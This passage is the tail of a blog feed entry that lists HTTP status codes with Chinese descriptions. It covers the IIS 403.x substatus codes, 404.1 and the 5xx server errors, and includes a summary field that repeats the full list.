&lt;td class=&quot;org-left&quot;&gt;禁止访问：要求客户证书&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.8&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：禁止站点访问&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.9&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：连接的用户过多&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.10&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：配置无效&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.11&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：密码更改&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.12&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：映射器拒绝访问&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.13&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：客户证书已被吊销&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.15&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：客户访问许可过多&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.16&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：客户证书不可信或者无效&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.17&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：客户证书已经到期或者尚未生效&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;404.1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;无法找到 Web 站点&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9e53cf2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org9e53cf2&quot;&gt;5xx：服务端出现的错误&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org9e53cf2&quot;&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;Code&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;500&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;服务器内部错误 — 服务器遇到错误，无法完成请求。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;501&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;尚未实施 — 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;502&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;错误网关 — 服务器作为网关或代理，从上游服务器收到无效响应。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;503&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;服务不可用 — 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;504&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;网关超时 — 服务器作为网关或代理，但是没有及时从上游服务器收到请求。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;505&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;HTTP 版本不受支持 — 服务器不支持请求中所用的 HTTP 协议版本。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="HTTP" /><summary type="html">2xx：成功 Code Description 200 正常：请求已完成。 201 正常：请求成功并且服务器创建了新的资源。 202 正常：服务器已接受请求，但尚未处理。 203 正常：服务器已成功处理了请求，但返回的信息可能来自另一来源。 204 正常：服务器成功处理了请求，但没有返回任何内容。 205 正常：服务器成功处理了请求，但没有返回任何内容。 206 正常：服务器成功处理了部分 GET 请求。 3xx：重定向 Code Description 301 已移动 — 请求的数据具有新的位置且更改是永久的。 302 已找到 — 请求的数据临时具有不同 URI。 303 请参阅其它 — 可在另一 URI 下找到对请求的响应，且应使用 GET 方法检索此响应。 304 未修改 — 未按预期修改文档。 305 使用代理 — 必须通过位置字段中提供的代理来访问请求的资源。 306 未使用 — 不再使用；保留此代码以便将来使用。 4xx：客户端出现的错误 表1： Code Descriptiono 400 错误请求 — 请求中有语法问题，或不能满足请求。 401 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 402 需要付款 — 表示计费系统已有效。 403 禁止 — 服务器拒绝请求。 404 未找到 — 服务器找不到请求的网页。 405 禁用 — 禁用请求中指定的方法。 406 不接受 — 无法使用请求的内容特性响应请求的网页。 407 需要代理授权 — 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 请求超时 — 服务器等候请求时发生超时。 409 冲突 — 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。 410 已删除 — 如果请求的资源已永久删除，服务器就会返回此响应。 411 需要有效长度 — 服务器不接受不含有效内容长度标头字段的请求。 412 未满足前提条件 — 服务器未满足请求者在请求中设置的其中一个前提条件。 413 请求实体过大 — 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 请求的 URI 过长 — 请求的 URI（通常为网址）过长，服务器无法处理。 415 不支持的媒体类型 — 请求的格式不受请求页面的支持。 416 请求范围不符合要求 — 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 未满足期望值 — &amp;gt;服务器未满足”期望”请求标头字段的要求。 表2： Code Description 401.1 未授权：登录失败 401.2 未授权：服务器配置问题导致登录失败 401.3 ACL 禁止访问资源 401.4 未授权：授权被筛选器拒绝 401.5 未授权：ISAPI 或 CGI 授权失败 403.1 禁止访问：禁止可执行访问 403.2 禁止访问：禁止读访问 403.3 禁止访问：禁止写访问 403.4 禁止访问：要求 SSL 403.5 禁止访问：要求 SSL 128 403.6 禁止访问：IP 地址被拒绝 403.7 禁止访问：要求客户证书 403.8 禁止访问：禁止站点访问 403.9 禁止访问：连接的用户过多 403.10 禁止访问：配置无效 403.11 禁止访问：密码更改 403.12 禁止访问：映射器拒绝访问 403.13 禁止访问：客户证书已被吊销 403.15 禁止访问：客户访问许可过多 403.16 禁止访问：客户证书不可信或者无效 403.17 禁止访问：客户证书已经到期或者尚未生效 404.1 无法找到 Web 站点 5xx：服务端出现的错误 Code Description 500 服务器内部错误 — 服务器遇到错误，无法完成请求。 501 尚未实施 — 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。 502 错误网关 — 服务器作为网关或代理，从上游服务器收到无效响应。 503 服务不可用 — 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。 504 网关超时 — 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505 HTTP 版本不受支持 — 服务器不支持请求中所用的 HTTP 协议版本。</summary></entry></feed>